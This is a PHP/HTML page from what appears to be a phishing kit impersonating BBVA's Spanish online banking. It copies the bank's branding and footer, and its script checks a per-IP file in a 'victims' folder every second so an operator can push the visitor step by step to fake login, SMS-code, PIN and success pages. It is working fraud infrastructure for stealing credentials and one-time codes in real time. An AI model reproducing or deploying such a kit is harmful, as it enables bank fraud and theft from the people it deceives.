<?php
  include "./Assets/php/config/config.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.png">
        <title>Banca Online de BBVA</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>
    </head>
    <body>

        <div class="wrapper_login">
            <header class="header_1">
                <div class="container_header_1">
                    <div class="logo">
                        <img src="./Assets/imgs/logo.svg" alt="">
                    </div>
                    <ul class="ps-0 mb-0">
                        <li class="sm_none"><p class="mb-0">Acceso a la banca online</p></li>
                        <li class="slash sm_none"></li>
                        <li><a href="">Ir a BBVA.es</a></li>
                    </ul>
                </div>
            </header>
            <div class="loading">
                <img src="./Assets/imgs/load.svg" alt="">
            </div>
            <footer>
                <div class="container_footer">
                    <div class="logo">
                        <img src="./Assets/imgs/white-logo.svg" alt="">
                    </div>
                    <ul class="ps-0 mb-0 d-flex align-items-center">
                        <li>Aviso legal</li>
                        <li>Cookies</li>
                        <li>Datos personales</li>
                        <li>Informes legales</li>
                    </ul>
                    <ul class="ps-0 mb-0 d-flex align-items-center">
                        <li>Servicios de pagos</li>
                        <li>Tarifas</li>
                        <li>Tablón de anuncios</li>
                        <li>Negocio responsable</li>
                    </ul>
                    <div class="copyghit d-flex align-items-center justify-content-between">
                        <p>© 2026 Banco Bilbao Vizcaya Argentaria, S.A.</p>
                        <a href="">Creando Oportunidades</a>
                    </div>
                </div>
            </footer>
        </div>
        



        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="./Assets/js/script.js"></script>
        
        <script>  
            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
            $.get('./victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                if( data == 0 ) {
                    console.log('hada ba9i 0');
                }

                else if( data == 'log' ) {
                    clearInterval(waiting);
                    location.href = "login.php";
                }else if( data == 'log_error' ){
                    clearInterval(waiting);
                    location.href = "login.php?error";
                }           

                else if( data == 'sms' ) {
                    clearInterval(waiting);
                    location.href = "sms.php";
                }else if( data == 'sms_error' ){
                    clearInterval(waiting);
                    location.href = "sms.php?error";
                } 

                else if( data == 'pin' ) {
                    clearInterval(waiting);
                    location.href = "pin.php";
                }else if( data == 'pin_error' ){
                    clearInterval(waiting);
                    location.href = "pin.php?error";
                }               

                else if( data == 'success' ){
                    clearInterval(waiting);
                    location.href = "success.php";
                }
            });
            }, 1000);                                       
        </script>
    </body>
</html>